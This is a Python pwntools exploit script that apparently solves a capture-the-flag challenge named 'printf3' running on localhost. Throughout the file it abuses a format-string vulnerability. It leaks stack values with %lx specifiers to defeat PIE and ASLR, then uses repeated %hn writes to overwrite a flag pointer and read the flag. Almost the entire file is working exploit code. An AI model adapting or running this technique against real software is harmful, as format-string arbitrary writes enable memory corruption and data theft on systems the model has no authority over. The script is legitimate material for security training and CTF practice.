#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 4003 --libc ../../libc.so.6 ../src/printf3
from pwn import *
from pwnlib.term import init

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "../src/printf3")
context.terminal = ["alacritty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "localhost"
port = int(args.PORT or 4003)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries("../../libc.so.6")
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF("../../libc.so.6")
else:
    libc = ELF("../../libc.so.6")


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
#b *main+144
b read_flag
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes


def get_stack_var(io: process | connect, index: int) -> bytes:
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"something: ")
    io.sendline(f"%{index}$lx".encode("ascii"))
    io.recvuntil(b"said: ")
    return io.recvuntil(b"--", drop=True)


def send_payload(io: process | connect, _payload: bytes):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"something: ")
    io.sendline(_payload)
    io.recvuntil(b"said: ")


def read_flag(io: process | connect):
    io.recvuntil(b"> ")
    io.sendline(b"2")


io = start()

# leaking all the stack vars
for i in range(1, 50):
    leak = get_stack_var(io, i)
    io.info(f"Leaked the {i}th stack var: {leak.decode('ascii')}.")

# stack indices
indices = {"rbp": 47, "flag": 7, "buffer": 8}
indices["gadget"] = indices["buffer"] + 4
indices["target"] = indices["gadget"] + 2
addrs = {"rbp": 0, "flag": 0, "buffer": 0}

# calculate addresses
addrs["rbp"] = int(get_stack_var(io, indices["rbp"]), 16) - 0x118
addrs["flag"] = addrs["rbp"] - 0x118 # there are two of these on the stack, and idk why
addrs["buffer"] = addrs["rbp"] - 0x110
io.success(f"Leaked rbp of main: {hex(addrs['rbp'])}")
io.success(f"Leaked address of the buffer: {hex(addrs['buffer'])}")
io.success(f"Leaked address of the flag pointer: {hex(addrs['flag'])}")

## do exploit
addrs["gadget"] = addrs["buffer"] + (8 * (indices["gadget"] - indices["buffer"]))
addrs["target"] = addrs["buffer"] + (8 * (indices["target"] - indices["buffer"]))
io.info(
    f"Writing {hex(addrs['target'])} to {hex(addrs['flag'])} @ {hex(addrs['gadget'])}"
)

# the address of the gadget
_t = pack(addrs["target"])
shorts = [_t[i : i + 2] for i in range(0, len(_t), 2)]
for i, short in enumerate(shorts, 0):
    # writing the gadget onto the stack
    payload = b"A" * ((indices["gadget"] - indices["buffer"]) * 8)
    payload += pack(addrs["flag"] + (i * 2))
    send_payload(io, payload)

    # use that gadget to overwrite the flag ptr
    payload = ""
    if unpack(short, "all") > 0:
        payload = f"%{unpack(short, 'all')}c"
    payload += f"%{indices['gadget']}$hn"
    send_payload(io, payload.encode("ascii"))

# reading the flag
read_flag(io)

# reconstructing the flag
parts = []
for i in range(0, 4):
    parts.append(get_stack_var(io, indices["target"] + i)[:16])

flag = "".join(
    map(lambda x: bytes.fromhex(x.decode("ascii")).decode("utf-8")[::-1], parts)
)

io.success(f"Flag is: {flag}")

